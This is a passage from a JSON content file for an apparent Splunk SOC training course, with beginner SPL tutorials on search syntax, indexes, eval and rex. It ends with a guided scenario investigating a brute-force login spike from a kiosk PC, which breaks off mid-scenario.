<li><strong>Coverage Gaps</strong> - Disabled rules, silent rules, missing domains</li>\n                        </ul>\n                    </div>\n                </div>\n\n                <div class=\"guide-callout tip\">\n                    <div class=\"guide-callout-title\">Pro Tip</div>\n                    <p>Schedule a weekly \"ES Health Review\" using this dashboard. Make it part of your SOC rhythm. Catch problems (broken searches, ignored alerts, unauthorized changes) before they become incidents.</p>\n                </div>\n            "
      }
    ]
  },
  "training": {
    "foundations": [
      {
        "id": "found-001",
        "title": "Anatomy of a Search",
        "type": "tutorial",
        "difficulty": "beginner",
        "duration": "15 min",
        "objectives": [
          "Understand the SPL search pipeline",
          "Identify different command types",
          "Read searches from left to right"
        ],
        "tags": [
          "basics",
          "pipeline",
          "syntax"
        ],
        "description": "Learn how SPL searches flow through the pipeline, from data retrieval to final output.",
        "content": {
          "sections": [
            {
              "title": "What is SPL?",
              "body": "<p>SPL (Search Processing Language) is Splunk's query language. Every search follows a <strong>pipeline model</strong> - data flows from left to right through a series of commands, each transforming the data in some way.</p>\n                        <p>Think of it like an assembly line: raw events come in, get processed by each command in sequence, and refined results come out.</p>",
              "spl": "index=main | stats count by host | sort -count | head 10",
              "explanation": "This search retrieves events from \"main\", counts them by host, sorts by count descending, and shows the top 10."
            },
            {
              "title": "The Pipe Character",
              "body": "<p>The <code>|</code> (pipe) character is the heart of SPL. It separates commands and passes results from one command to the next.</p>\n                        <p>Each command after the pipe receives the output of the previous command as its input.</p>",
              "spl": "index=security sourcetype=linux_secure | where action=\"failure\" | stats count by user",
              "explanation": "Events flow: retrieve from index  filter failures  count by user."
            },
            {
              "title": "Command Types",
              "body": "<p>SPL commands fall into categories:</p>\n                        <ul>\n                            <li><strong>Streaming</strong>: Process events one at a time (where, eval, rex)</li>\n                            <li><strong>Transforming</strong>: Aggregate events into statistics (stats, timechart, chart)</li>\n                            <li><strong>Generating</strong>: Create events from scratch (makeresults, inputlookup)</li>\n                            <li><strong>Ordering</strong>: Reorder results (sort, reverse, head, tail)</li>\n                        </ul>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "Reading a Search",
              "body": "<p>When reading an SPL search, work left to right and ask:</p>\n                        <ol>\n                            <li><strong>Where</strong> is data coming from? (index, sourcetype)</li>\n                            <li><strong>What</strong> filtering happens? (where, search terms)</li>\n                            <li><strong>How</strong> is it transformed? (stats, eval, rex)</li>\n                            <li><strong>What</strong> is the output? (table, final aggregation)</li>\n                        </ol>",
              "spl": "index=web sourcetype=access_combined status>=400 | stats count by status, uri_path | where count > 100 | sort -count",
              "explanation": "Read as: \"From web logs, find errors (400+), count by status and path, keep only those with 100+ occurrences, sort by most frequent.\""
            }
          ]
        }
      },
      {
        "id": "found-006",
        "title": "Indexes, Sourcetypes, and Finding Your Data",
        "type": "tutorial",
        "difficulty": "beginner",
        "duration": "15 min",
        "objectives": [
          "Understand how Splunk organizes data",
          "Choose the right index and sourcetype for your search",
          "Use metadata commands to explore available data"
        ],
        "tags": [
          "basics",
          "indexes",
          "sourcetypes",
          "metadata"
        ],
        "description": "Learn how Splunk organizes data so you know where to look before you search.",
        "content": {
          "sections": [
            {
              "title": "The Data Hierarchy",
              "body": "<p>Splunk organizes data in a hierarchy:</p>\n                        <ul>\n                            <li><strong>Index</strong>  A repository of data (like a database). Examples: security, web, firewall</li>\n                            <li><strong>Sourcetype</strong>  The format/type of data. Examples: syslog, access_combined, WinEventLog</li>\n                            <li><strong>Source</strong>  Where the data came from. Examples: /var/log/messages, UDP:514</li>\n                            <li><strong>Host</strong>  The machine that generated the data</li>\n                        </ul>\n                        <p>Every event has these four metadata fields. Using them makes searches faster and more accurate.</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "Why Indexes Matter",
              "body": "<p>Indexes are the most important search filter. Specifying an index:</p>\n                        <ul>\n                            <li><strong>Speeds up searches</strong>  Splunk only looks in that index</li>\n                            <li><strong>Reduces noise</strong>  You won't see unrelated events</li>\n                            <li><strong>Respects permissions</strong>  You may only have access to certain indexes</li>\n                        </ul>\n                        <p><span style=\"color: #e74c3c;\">Never use</span> <code>index=*</code> in production  it's slow and returns overwhelming results.</p>",
              "spl": "index=security earliest=-1h | stats count by sourcetype",
              "explanation": "Searches only the security index and shows what sourcetypes are present in the last hour."
            },
            {
              "title": "Common Security Indexes",
              "body": "<p>Typical index organization in a SOC environment:</p>\n                        <table style=\"width:100%; border-collapse: collapse; margin: 10px 0;\">\n                            <tr style=\"background: rgba(255,255,255,0.1);\"><td style=\"padding:8px; border:1px solid #444;\"><strong>Index</strong></td><td style=\"padding:8px; border:1px solid #444;\"><strong>Contains</strong></td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">wineventlog</td><td style=\"padding:8px; border:1px solid #444;\">Windows Security, System, Application logs</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">linux_secure</td><td style=\"padding:8px; border:1px solid #444;\">Linux authentication, sudo, SSH</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">firewall</td><td style=\"padding:8px; border:1px solid #444;\">Network traffic, blocked/allowed connections</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">proxy</td><td style=\"padding:8px; border:1px solid #444;\">Web proxy logs, URL filtering</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">web</td><td style=\"padding:8px; border:1px solid #444;\">Web server access logs</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">dns</td><td style=\"padding:8px; border:1px solid #444;\">DNS queries and responses</td></tr>\n                            <tr><td style=\"padding:8px; border:1px solid #444;\">sysmon</td><td style=\"padding:8px; border:1px solid #444;\">Endpoint process, network, file events</td></tr>\n                        </table>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "Sourcetypes Identify Format",
              "body": "<p>The sourcetype tells Splunk how to parse the data. Different sourcetypes have different fields automatically extracted:</p>\n                        <ul>\n                            <li><code>WinEventLog:Security</code>  Has EventCode, TargetUserName, LogonType</li>\n                            <li><code>access_combined</code>  Has status, uri_path, method, bytes</li>\n                            <li><code>syslog</code>  Has facility, severity, process</li>\n                        </ul>",
              "spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" EventCode=4625 | head 5 | table _time, EventCode, TargetUserName, IpAddress",
              "explanation": "Using both index and sourcetype focuses on Windows Security events, where EventCode and TargetUserName are pre-extracted."
            },
            {
              "title": "Discovering Available Indexes",
              "body": "<p>Use the <code>eventcount</code> command or <code>| metadata</code> to explore what data exists:</p>",
              "spl": "| eventcount summarize=false index=* | table index, count | sort -count",
              "explanation": "Shows all indexes you have access to and how many events are in each."
            },
            {
              "title": "Exploring Sourcetypes",
              "body": "<p>Once you pick an index, see what sourcetypes it contains:</p>",
              "spl": "| metadata type=sourcetypes index=security | table sourcetype, totalCount, recentTime | sort -totalCount",
              "explanation": "Lists all sourcetypes in the security index with event counts and last event time."
            },
            {
              "title": "Discovering Fields",
              "body": "<p>When you encounter a new sourcetype, explore what fields are available:</p>\n                        <ul>\n                            <li><code>| fieldsummary</code>  Shows all fields with statistics</li>\n                            <li><code>| fields</code>  Lists available fields</li>\n                            <li>Click \"All Fields\" in the Splunk UI sidebar</li>\n                        </ul>",
              "spl": "index=firewall sourcetype=pan:traffic | head 1000 | fieldsummary | where count > 500 | table field, count, distinct_count | sort -count",
              "explanation": "Analyzes 1000 firewall events to find commonly-populated fields. Fields appearing in most events are likely the most useful."
            },
            {
              "title": "The _raw and _time Fields",
              "body": "<p>Two special fields exist in every event:</p>\n                        <ul>\n                            <li><code>_raw</code>  The complete original event text</li>\n                            <li><code>_time</code>  The timestamp (in epoch seconds)</li>\n                        </ul>\n                        <p>When automatic field extraction fails, you can always parse <code>_raw</code> with rex.</p>",
              "spl": "index=linux_secure | head 1 | table _time, _raw",
              "explanation": "Shows the raw event exactly as it was ingested, plus the parsed timestamp."
            },
            {
              "title": "Building Your Search Strategy",
              "body": "<p>When starting an investigation:</p>\n                        <ol>\n                            <li><strong>Identify the data type</strong>  Authentication? Network? Endpoint?</li>\n                            <li><strong>Find the index</strong>  Use eventcount or ask your Splunk admin</li>\n                            <li><strong>Check the sourcetype</strong>  Different vendors have different formats</li>\n                            <li><strong>Explore the fields</strong>  Use fieldsummary to understand what's available</li>\n                            <li><strong>Write your search</strong>  Start specific: index + sourcetype + key fields</li>\n                        </ol>",
              "spl": "index=wineventlog sourcetype=\"WinEventLog:Security\" | stats count by EventCode | sort -count | head 20",
              "explanation": "A good first search: pick your index and sourcetype, then see what event types are most common."
            }
          ]
        }
      },
      {
        "id": "found-007",
        "title": "Search Syntax Essentials",
        "type": "tutorial",
        "difficulty": "beginner",
        "duration": "15 min",
        "objectives": [
          "Combine search terms with AND, OR, NOT correctly",
          "Use wildcards and quotes for precise matching",
          "Avoid common syntax mistakes that return wrong results"
        ],
        "tags": [
          "basics",
          "syntax",
          "boolean",
          "search"
        ],
        "description": "Master the fundamentals of SPL search syntax to write accurate, efficient queries.",
        "content": {
          "sections": [
            {
              "title": "Implicit AND",
              "body": "<p>When you write multiple terms in a search, Splunk treats them as AND by default:</p>\n                        <pre>index=security failed password</pre>\n                        <p>This finds events containing \"failed\" AND \"password\". Both terms must appear.</p>\n                        <p><strong>Important:</strong> Spaces between terms mean AND. You don't need to write it explicitly.</p>",
              "spl": "index=security failed login | head 10",
              "explanation": "Finds events containing both \"failed\" AND \"login\" in the security index."
            },
            {
              "title": "Using OR",
              "body": "<p>Use OR to match any of several terms. <strong>Critical:</strong> OR has lower precedence than AND, so use parentheses!</p>\n                        <p><span style=\"color: #e74c3c;\"> Wrong:</span> <code>index=web status=404 OR 500</code>  This means (index=web AND status=404) OR (500 anywhere)</p>\n                        <p><span style=\"color: #27ae60;\"> Right:</span> <code>index=web (status=404 OR status=500)</code>  This correctly finds 404 or 500 status codes</p>",
              "spl": "index=web (status=404 OR status=500 OR status=503) | stats count by status",
              "explanation": "Parentheses group the OR conditions, so all three status codes are checked against the status field."
            },
            {
              "title": "Using NOT",
              "body": "<p>Exclude events with NOT. You can also use != for field values:</p>\n                        <ul>\n                            <li><code>NOT error</code>  Exclude events containing \"error\"</li>\n                            <li><code>status!=200</code>  Exclude status code 200</li>\n                            <li><code>NOT (status=200 OR status=304)</code>  Exclude successful responses</li>\n                        </ul>",
              "spl": "index=web NOT status=200 NOT status=304 | stats count by status | sort -count",
              "explanation": "Shows all non-successful HTTP responses by excluding 200 (OK) and 304 (Not Modified)."
            },
            {
              "title": "Wildcards",
              "body": "<p>The asterisk <code>*</code> matches any characters:</p>\n                        <ul>\n                            <li><code>fail*</code>  Matches fail, failed, failure, failing</li>\n                            <li><code>*.exe</code>  Matches any .exe filename</li>\n                            <li><code>10.0.0.*</code>  Matches any IP in the 10.0.0.x subnet</li>\n                            <li><code>*admin*</code>  Matches anything containing \"admin\"</li>\n                        </ul>\n                        <p><strong>Performance tip:</strong> Leading wildcards (<code>*admin</code>) are slower than trailing wildcards (<code>admin*</code>).</p>",
              "spl": "index=wineventlog user=*admin* | stats count by user",
              "explanation": "Finds all events where the user field contains \"admin\" anywhere in the value."
            },
            {
              "title": "Exact Phrases with Quotes",
              "body": "<p>Use double quotes to search for exact phrases:</p>\n                        <ul>\n                            <li><code>\"failed login\"</code>  Exact phrase match</li>\n                            <li><code>\"192.168.1.1\"</code>  Treats dots as literal (not wildcards)</li>\n                            <li><code>error message</code>  Two separate words (both must appear, any order)</li>\n                            <li><code>\"error message\"</code>  Exact phrase in that order</li>\n                        </ul>",
              "spl": "index=linux_secure \"authentication failure\" | stats count by host",
              "explanation": "Finds the exact phrase \"authentication failure\"  not events with just \"authentication\" or just \"failure\"."
            },
            {
              "title": "Field-Value Syntax",
              "body": "<p>Always use <code>field=value</code> when searching specific fields. This is faster and more accurate than free-text search.</p>\n                        <ul>\n                            <li><code>status=404</code>  Field equals value</li>\n                            <li><code>status!=404</code>  Field not equal to value</li>\n                            <li><code>status>399</code>  Numeric comparison</li>\n                            <li><code>status IN (400, 401, 403, 404)</code>  Match any in list</li>\n                        </ul>",
              "spl": "index=firewall action=blocked dest_port IN (22, 23, 3389) | stats count by src_ip, dest_port",
              "explanation": "Finds blocked connections to sensitive ports (SSH, Telnet, RDP) using field=value syntax and IN operator."
            },
            {
              "title": "Case Sensitivity",
              "body": "<p>By default, Splunk searches are <strong>case-insensitive</strong> for text matching:</p>\n                        <ul>\n                            <li><code>error</code> matches \"Error\", \"ERROR\", \"error\"</li>\n                            <li>Field names are always case-sensitive: <code>Status</code>  <code>status</code></li>\n                            <li>Use <code>| where</code> for case-sensitive matching if needed</li>\n                        </ul>",
              "spl": "index=app_logs | where match(message, \"ERROR\") | head 10",
              "explanation": "The where command with match() provides case-sensitive searching when needed."
            },
            {
              "title": "Common Mistakes to Avoid",
              "body": "<p><strong>Mistake 1:</strong> Forgetting parentheses with OR</p>\n                        <pre style=\"color: #e74c3c;\">index=web status=200 OR status=404</pre>\n                        <p>This actually means: (index=web AND status=200) OR (status=404 in any index)</p>\n\n                        <p><strong>Mistake 2:</strong> Using AND explicitly when not needed</p>\n                        <pre>index=web AND status=404 AND host=web01</pre>\n                        <p>Works, but <code>index=web status=404 host=web01</code> is cleaner.</p>\n\n                        <p><strong>Mistake 3:</strong> Wildcards in quotes</p>\n                        <pre style=\"color: #e74c3c;\">\"user=admin*\"</pre>\n                        <p>The * is treated literally inside quotes. Use: <code>user=admin*</code></p>",
              "spl": null,
              "explanation": null
            }
          ]
        }
      },
      {
        "id": "found-002",
        "title": "Understanding Time in Splunk",
        "type": "tutorial",
        "difficulty": "beginner",
        "duration": "20 min",
        "objectives": [
          "Use time range pickers effectively",
          "Apply earliest and latest modifiers",
          "Create time-based visualizations"
        ],
        "tags": [
          "basics",
          "time",
          "timechart"
        ],
        "description": "Master time concepts in Splunk - from relative time modifiers to time-series analysis.",
        "content": {
          "sections": [
            {
              "title": "Relative Time Modifiers",
              "body": "<p>Splunk uses intuitive time modifiers:</p>\n                        <ul>\n                            <li><code>-1h</code> = 1 hour ago</li>\n                            <li><code>-7d</code> = 7 days ago</li>\n                            <li><code>-1w</code> = 1 week ago</li>\n                            <li><code>@d</code> = snap to beginning of day</li>\n                            <li><code>@h</code> = snap to beginning of hour</li>\n                        </ul>",
              "spl": "index=security earliest=-24h@h latest=now",
              "explanation": "Search from 24 hours ago (snapped to the hour) until now."
            },
            {
              "title": "The timechart Command",
              "body": "<p><code>timechart</code> is essential for time-series analysis. It automatically buckets events by time and calculates statistics.</p>\n                        <p>Use span= to control bucket size.</p>",
              "spl": "index=web | timechart span=1h count by status",
              "explanation": "Creates an hourly chart showing event counts for each HTTP status code."
            },
            {
              "title": "Time-Based Filtering",
              "body": "<p>Use time fields for precise filtering:</p>\n                        <ul>\n                            <li><code>_time</code> - when Splunk indexed the event</li>\n                            <li>Custom time fields from your data</li>\n                            <li><code>earliest=</code> and <code>latest=</code> in search</li>\n                        </ul>",
              "spl": "index=firewall | where _time >= relative_time(now(), \"-1h\") | stats count by src_ip",
              "explanation": "Filter to events from the last hour using the where command."
            },
            {
              "title": "Comparing Time Periods",
              "body": "<p>Compare current data to historical baselines using time modifiers in subsearches or append.</p>",
              "spl": "index=web | timechart span=1h count | appendcols [search index=web earliest=-7d@d latest=-6d@d | timechart span=1h count | rename count as \"Last Week\"]",
              "explanation": "Compare current hourly traffic to the same period last week."
            }
          ]
        }
      },
      {
        "id": "found-008",
        "title": "Creating Fields with Eval",
        "type": "tutorial",
        "difficulty": "beginner",
        "duration": "20 min",
        "objectives": [
          "Create calculated fields from existing data",
          "Use conditional logic with if and case",
          "Apply common eval functions for data transformation"
        ],
        "tags": [
          "basics",
          "eval",
          "calculated-fields",
          "functions"
        ],
        "description": "Learn to transform, calculate, and enrich your data using the versatile eval command.",
        "content": {
          "sections": [
            {
              "title": "What is Eval?",
              "body": "<p>The <code>eval</code> command creates new fields or modifies existing ones using expressions. It's one of the most frequently used SPL commands.</p>\n                        <pre>| eval new_field = expression</pre>\n                        <p>The expression can include math, string operations, conditionals, and functions.</p>",
              "spl": "index=firewall | eval total_bytes = bytes_in + bytes_out | table src_ip, bytes_in, bytes_out, total_bytes",
              "explanation": "Creates a new field \"total_bytes\" by adding bytes_in and bytes_out together."
            },
            {
              "title": "Basic Math Operations",
              "body": "<p>Eval supports standard arithmetic:</p>\n                        <ul>\n                            <li><code>+</code> Addition</li>\n                            <li><code>-</code> Subtraction</li>\n                            <li><code>*</code> Multiplication</li>\n                            <li><code>/</code> Division</li>\n                            <li><code>%</code> Modulo (remainder)</li>\n                        </ul>",
              "spl": "index=firewall | eval mb_out = round(bytes_out / 1024 / 1024, 2) | eval transfer_ratio = round(bytes_out / bytes_in, 2) | table src_ip, mb_out, transfer_ratio",
              "explanation": "Converts bytes to megabytes and calculates the ratio of outbound to inbound traffic."
            },
            {
              "title": "The if() Function",
              "body": "<p>Create conditional values with <code>if(condition, true_value, false_value)</code>:</p>",
              "spl": "index=web | eval status_type = if(status >= 400, \"error\", \"success\") | stats count by status_type",
              "explanation": "Labels each request as \"error\" or \"success\" based on HTTP status code, then counts each category."
            },
            {
              "title": "The case() Function",
              "body": "<p>For multiple conditions, use <code>case()</code> instead of nested if statements:</p>\n                        <pre>case(condition1, value1, condition2, value2, ..., true(), default)</pre>\n                        <p>Conditions are evaluated in order. Use <code>true()</code> as the final condition for a default value.</p>",
              "spl": "index=web | eval status_category = case(status < 300, \"success\", status < 400, \"redirect\", status < 500, \"client_error\", status >= 500, \"server_error\", true(), \"unknown\") | stats count by status_category",
              "explanation": "Categorizes HTTP status codes into descriptive groups using multiple conditions."
            },
            {
              "title": "String Functions",
              "body": "<p>Common string manipulation functions:</p>\n                        <ul>\n                            <li><code>lower(x)</code> / <code>upper(x)</code>  Change case</li>\n                            <li><code>len(x)</code>  String length</li>\n                            <li><code>substr(x, start, length)</code>  Extract substring</li>\n                            <li><code>replace(x, old, new)</code>  Replace text</li>\n                            <li><code>split(x, delim)</code>  Split into multivalue</li>\n                            <li><code>trim(x)</code> / <code>ltrim(x)</code> / <code>rtrim(x)</code>  Remove whitespace</li>\n                        </ul>",
              "spl": "index=web | eval domain = lower(host) | eval short_uri = substr(uri_path, 1, 30) | table domain, short_uri, status",
              "explanation": "Normalizes hostname to lowercase and truncates long URIs for cleaner output."
            },
            {
              "title": "Working with Time",
              "body": "<p>Time functions are essential for SOC analysis:</p>\n                        <ul>\n                            <li><code>now()</code>  Current timestamp</li>\n                            <li><code>strftime(_time, format)</code>  Format timestamp as string</li>\n                            <li><code>strptime(string, format)</code>  Parse string to timestamp</li>\n                            <li><code>relative_time(time, modifier)</code>  Calculate relative time</li>\n                        </ul>",
              "spl": "index=vpn | eval hour = strftime(_time, \"%H\") | eval day = strftime(_time, \"%A\") | eval age_hours = round((now() - _time) / 3600, 1) | table user, day, hour, age_hours",
              "explanation": "Extracts the hour and day name from event time, and calculates how many hours ago the event occurred."
            },
            {
              "title": "Null and Coalesce",
              "body": "<p>Handle missing values gracefully:</p>\n                        <ul>\n                            <li><code>isnull(x)</code>  Returns true if field is null</li>\n                            <li><code>isnotnull(x)</code>  Returns true if field has a value</li>\n                            <li><code>coalesce(x, y, z)</code>  Returns first non-null value</li>\n                            <li><code>nullif(x, y)</code>  Returns null if x equals y</li>\n                        </ul>",
              "spl": "index=firewall | eval src_host = coalesce(src_hostname, src_ip, \"unknown\") | stats count by src_host",
              "explanation": "Uses hostname if available, falls back to IP, then to \"unknown\" if both are missing."
            },
            {
              "title": "Multiple Eval Statements",
              "body": "<p>You can chain multiple assignments in one eval using commas, or use separate eval commands:</p>",
              "spl": "index=firewall | eval mb_in = round(bytes_in/1024/1024, 2), mb_out = round(bytes_out/1024/1024, 2), direction = if(mb_out > mb_in, \"outbound\", \"inbound\") | table src_ip, mb_in, mb_out, direction",
              "explanation": "Creates three new fields in a single eval command, with the third field depending on the first two."
            },
            {
              "title": "Type Conversion",
              "body": "<p>Convert between types when needed:</p>\n                        <ul>\n                            <li><code>tonumber(x)</code>  Convert to number</li>\n                            <li><code>tostring(x)</code>  Convert to string</li>\n                            <li><code>tostring(x, \"hex\")</code>  Convert to hexadecimal</li>\n                            <li><code>tostring(x, \"commas\")</code>  Number with comma separators</li>\n                        </ul>",
              "spl": "index=firewall | stats sum(bytes_out) as total_bytes by src_ip | eval formatted = tostring(total_bytes, \"commas\") | eval hex_bytes = tostring(total_bytes, \"hex\") | table src_ip, formatted, hex_bytes",
              "explanation": "Demonstrates formatting numbers with commas for readability and converting to hexadecimal."
            }
          ]
        }
      },
      {
        "id": "found-009",
        "title": "Extracting Fields with Rex",
        "type": "tutorial",
        "difficulty": "beginner",
        "duration": "25 min",
        "objectives": [
          "Write basic regex patterns for common data types",
          "Use rex to create new fields from raw events",
          "Handle multiple captures and optional matches"
        ],
        "tags": [
          "basics",
          "rex",
          "regex",
          "field-extraction"
        ],
        "description": "Learn to parse unstructured log data and extract the fields you need using regular expressions.",
        "content": {
          "sections": [
            {
              "title": "Why Field Extraction Matters",
              "body": "<p>Not all data arrives with neat, pre-defined fields. Many logs come as raw text that Splunk can't automatically parse. The <code>rex</code> command lets you extract specific values using regular expressions (regex).</p>\n                        <p>As a SOC analyst, you'll encounter logs from custom applications, legacy systems, and edge devices that require manual field extraction. Mastering rex is essential.</p>",
              "spl": null,
              "explanation": null
            },
            {
              "title": "Basic Rex Syntax",
              "body": "<p>The rex command uses named capture groups to create fields:</p>\n                        <pre>| rex field=_raw \"(?&lt;field_name&gt;pattern)\"</pre>\n                        <p>The <code>(?&lt;name&gt;...)</code> syntax captures whatever matches the pattern inside and assigns it to a field called \"name\".</p>",
              "spl": "index=web | rex field=_raw \"(?<client_ip>\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})\" | table _time, client_ip, _raw",
              "explanation": "This extracts an IP address pattern (4 groups of 1-3 digits separated by dots) into a field called client_ip."
            },
            {
              "title": "Common Extraction Patterns",
              "body": "<p>Memorize these building blocks:</p>\n                        <ul>\n                            <li><code>\\d+</code>  One or more digits</li>\n                            <li><code>\\w+</code>  One or more word characters (letters, digits, underscore)</li>\n                            <li><code>[^\\s]+</code>  One or more non-whitespace characters</li>\n                            <li><code>[^\"]+</code>  Everything until a quote (useful for quoted strings)</li>\n                            <li><code>.*?</code>  Any characters (non-greedy)</li>\n                        </ul>",
              "spl": "index=linux_secure | rex field=_raw \"user=(?<username>\\w+)\" | rex field=_raw \"src=(?<source_ip>[^\\s]+)\" | stats count by username, source_ip",
              "explanation": "Extracts username after \"user=\" and source IP after \"src=\" from Linux auth logs."
            },
            {
              "title": "Extracting from Structured Patterns",
              "body": "<p>Most logs follow patterns. Use literal text as anchors to find what you need:</p>\n                        <p>Example log: <code>2024-01-15 10:23:45 ERROR [AuthService] Failed login for user \"jsmith\" from 192.168.1.50</code></p>",
              "spl": "index=app_logs | rex field=_raw \"\\[(?<service>\\w+)\\].*user \\\"(?<user>[^\\\"]+)\\\".*from (?<src_ip>\\d+\\.\\d+\\.\\d+\\.\\d+)\" | table _time, service, user, src_ip",
              "explanation": "We anchor on \"[\" for service name, \"user \\\"\" for username (note the escaped quotes), and \"from \" for the IP address."
            },
            {
              "title": "Multiple Captures in One Rex",
              "body": "<p>You can capture multiple fields in a single rex command. This is more efficient than multiple rex commands.</p>",
              "spl": "index=firewall | rex field=_raw \"src=(?<src_ip>[^\\s]+)\\s+dst=(?<dst_ip>[^\\s]+)\\s+proto=(?<protocol>\\w+)\\s+action=(?<action>\\w+)\" | stats count by src_ip, dst_ip, protocol, action",
              "explanation": "Extracts four fields in one pass: source IP, destination IP, protocol, and action from firewall logs."
            },
            {
              "title": "Handling Optional Fields",
              "body": "<p>Some fields may not appear in every event. Use <code>?</code> to make parts optional:</p>\n                        <ul>\n                            <li><code>(?:pattern)?</code>  Makes an entire group optional</li>\n                            <li><code>pattern*</code>  Zero or more occurrences</li>\n                        </ul>",
              "spl": "index=web | rex field=_raw \"status=(?<status>\\d+)(?:\\s+bytes=(?<bytes>\\d+))?\" | table status, bytes",
              "explanation": "Status is always captured, but bytes is optional  it will be null if not present in the event."
            },
            {
              "title": "Rex in sed Mode",
              "body": "<p>Rex can also replace text using <code>mode=sed</code>. This is useful for masking sensitive data or cleaning up fields:</p>",
              "spl": "index=app_logs | rex field=_raw mode=sed \"s/password=\\S+/password=REDACTED/g\" | table _raw",
              "explanation": "Replaces any password value with \"REDACTED\" using sed-style substitution."
            },
            {
              "title": "Practice: Parse a Complex Log",
              "body": "<p>Given this Apache access log format:</p>\n                        <pre>192.168.1.50 - jsmith [15/Jan/2024:10:23:45 -0500] \"GET /api/users HTTP/1.1\" 200 1234</pre>\n                        <p>Extract: client IP, username, HTTP method, URI path, status code, and response size.</p>",
              "spl": "index=web sourcetype=access_combined | rex field=_raw \"^(?<client_ip>\\S+)\\s+\\S+\\s+(?<user>\\S+)\\s+\\[[^\\]]+\\]\\s+\\\"(?<method>\\w+)\\s+(?<uri>\\S+)[^\\\"]*\\\"\\s+(?<status>\\d+)\\s+(?<bytes>\\d+)\" | table client_ip, user, method, uri, status, bytes",
              "explanation": "A complete Apache log parser. Each field is anchored by the known log structure: IP first, then dash, username, bracketed timestamp, quoted request line, status, and bytes."
            }
          ]
        }
      },
      {
        "id": "found-003",
        "title": "Your First Alert Investigation",
        "type": "scenario",
        "difficulty": "beginner",
        "duration": "20 min",
        "objectives": [
          "Respond to a basic security alert",
          "Analyze authentication patterns",
          "Document findings systematically"
        ],
        "tags": [
          "authentication",
          "windows",
          "security",
          "basics"
        ],
        "description": "Investigate a spike in failed login attempts - your first SOC investigation scenario.",
        "content": {
          "situation": "You're a junior SOC analyst and receive an alert: \"500% increase in failed authentication events in the last hour.\" Your task is to investigate and determine if this is a threat or false positive.",
          "steps": [
            {
              "question": "First, let's confirm the alert. How would you see the volume of failed logins over time?",
              "hint": "Think about counting events over time periods. Which command creates time-based charts?",
              "spl": "index=wineventlog EventCode=4625 earliest=-4h | timechart span=10m count",
              "analysis": "This shows failed login (EventCode 4625) volume in 10-minute buckets over the last 4 hours.",
              "output": {
                "columns": [
                  "_time",
                  "count"
                ],
                "rows": [
                  {
                    "_time": "2024-01-15 10:00",
                    "count": "18"
                  },
                  {
                    "_time": "2024-01-15 10:10",
                    "count": "22"
                  },
                  {
                    "_time": "2024-01-15 10:20",
                    "count": "19"
                  },
                  {
                    "_time": "2024-01-15 11:50",
                    "count": "487"
                  },
                  {
                    "_time": "2024-01-15 12:00",
                    "count": "523"
                  }
                ],
                "truncated": "Showing 5 of 24 time buckets"
              },
              "finding": "Confirmed: We see a clear spike starting around 2 hours ago, with counts jumping from baseline ~20 to over 500 per 10-minute window."
            },
            {
              "question": "The spike is real. Now let's identify WHO is being targeted. Which accounts are seeing the most failures?",
              "hint": "You need to count failures grouped by the target account field.",
              "spl": "index=wineventlog EventCode=4625 earliest=-2h | stats count by TargetUserName | sort -count | head 20",
              "analysis": "This counts failed logins by target username and shows the top 20.",
              "output": {
                "columns": [
                  "TargetUserName",
                  "count"
                ],
                "rows": [
                  {
                    "TargetUserName": "administrator",
                    "count": "3247"
                  },
                  {
                    "TargetUserName": "admin",
                    "count": "3189"
                  },
                  {
                    "TargetUserName": "root",
                    "count": "412"
                  },
                  {
                    "TargetUserName": "svc_backup",
                    "count": "5"
                  },
                  {
                    "TargetUserName": "svc_sql",
                    "count": "3"
                  }
                ],
                "truncated": "Showing 5 of 20 results"
              },
              "finding": "Critical: The \"administrator\" and \"admin\" accounts have 3,000+ failures each. Service accounts like \"svc_backup\" show only normal baseline failures (~5 each)."
            },
            {
              "question": "Administrator accounts are being targeted. Where are these attempts coming from?",
              "hint": "Look at source IP addresses or workstation names.",
              "spl": "index=wineventlog EventCode=4625 earliest=-2h TargetUserName IN (\"administrator\", \"admin\") | stats count by IpAddress | sort -count",
              "analysis": "This shows which IP addresses are generating the failed logins for admin accounts.",
              "output": {
                "columns": [
                  "IpAddress",
                  "count"
                ],
                "rows": [
                  {
                    "IpAddress": "10.45.23.99",
                    "count": "6436"
                  }
                ]
              },
              "finding": "All 6,000+ failures originate from a single IP: 10.45.23.99. This is NOT distributed - it's one source."
            },
            {
              "question": "Single source attacking admin accounts - this looks like brute force. Has the attacker succeeded? Check for any successful logins from that IP.",
              "hint": "EventCode 4624 is successful login. Look for the suspicious IP.",
              "spl": "index=wineventlog EventCode=4624 earliest=-2h IpAddress=\"10.45.23.99\" | stats count by TargetUserName, LogonType",
              "analysis": "This checks if the attacking IP has any successful authentications.",
              "output": {
                "columns": [
                  "TargetUserName",
                  "LogonType",
                  "count"
                ],
                "rows": [],
                "emptyMessage": "No results found"
              },
              "finding": "Good news: Zero successful logins from the attacking IP. The brute force attempt has not succeeded."
            },
            {
              "question": "Let's identify the attacking system. Is this IP internal or external? What do we know about it?",
              "hint": "Check asset inventory or DHCP logs for IP context.",
              "spl": "index=asset_inventory ip=\"10.45.23.99\" | table hostname, department, owner, last_seen",
              "analysis": "Cross-reference with asset inventory to identify the source machine.",
              "output": {
                "columns": [
                  "hostname",
                  "department",
                  "owner",
                  "last_seen"
                ],
                "rows": [
                  {
                    "hostname": "WKS-RECEPTION-02",
                    "department": "Lobby",
                    "owner": "Shared Kiosk",
                    "last_seen": "2024-01-15 12:05"
                  }
                ]
              },
              "finding": "The IP belongs to \"WKS-RECEPTION-02\" in the Lobby. This is a shared kiosk PC that shouldn't be making admin login attempts."
            }
          ],
